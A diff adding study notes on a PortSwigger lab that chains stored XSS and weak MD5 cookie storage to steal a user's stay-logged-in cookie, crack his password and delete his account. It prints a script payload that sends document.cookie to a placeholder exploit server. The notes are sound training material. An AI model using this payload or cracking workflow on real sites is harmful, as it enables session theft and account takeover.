@@ -74,3 +74,41 @@ Authentication flows often have multiple steps: `Login -> 2FA -> Dashboard`.
 
 ---
 **Key Takeaway:** Always ensure the server has generated a session/code for the victim before starting a brute-force attack.
+
+## 3rd lab
+
+#  Lab: Offline Password Cracking (PortSwigger)
+**Goal:** Steal Carlos's 'stay-logged-in' cookie, crack his password offline, and delete his account.
+**Vulnerabilities Chained:** Stored XSS + Insecure Credential Storage (Weak Cryptography).
+
+##  Methodology & Steps
+
+### Step 1: Reconnaissance (Understanding the Mechanism)
+1. Log in with your own credentials (`wiener:peter`) and check the `stay-logged-in` box.
+2. Intercept the request in Burp Suite and observe the `stay-logged-in` cookie.
+3. Decode the cookie using Burp Decoder (**Base64**). 
+4. **Observation:** The decoded format is `username:MD5_Hash_Of_Password`.
+
+### Step 2: Payload Injection (Stored XSS)
+1. Navigate to the Blog Comments section.
+2. The comment input is vulnerable to Stored XSS. Inject a payload to steal the document cookie and send it to your Exploit Server.
+   * **Payload used:** `<script>fetch('https://YOUR-EXPLOIT-SERVER/log?cookie=' + document.cookie);</script>`
+3. Submit the comment.
+
+### Step 3: Harvesting the Hash
+1. Wait for the victim (Carlos) to view the comment page.
+2. Check the Access Logs on your Exploit Server.
+3. Locate the incoming request containing Carlos's cookie: `stay-logged-in=Y2FybG9zO...`
+4. Copy the Base64 string.
+
+### Step 4: Offline Cracking
+1. Decode Carlos's Base64 cookie in Burp Decoder.
+2. Extract the MD5 hash portion (e.g., `carlos:THE_HASH`).
+3. Take the extracted hash and use an offline rainbow table service like **CrackStation.net** to crack the MD5 hash and reveal the plaintext password.
+
+### Step 5: Exploit
+1. Use the cracked plaintext password to log in as `carlos`.
+2. Navigate to "My Account" and click **Delete Account** to solve the lab.
+
+---
+**Key Takeaway:** Never store sensitive data like password hashes in client-side cookies. If you must use a 'remember me' token, use a strong, randomly generated, un-guessable session token. Also, MD5 is deprecated and should never be used for password hashing.
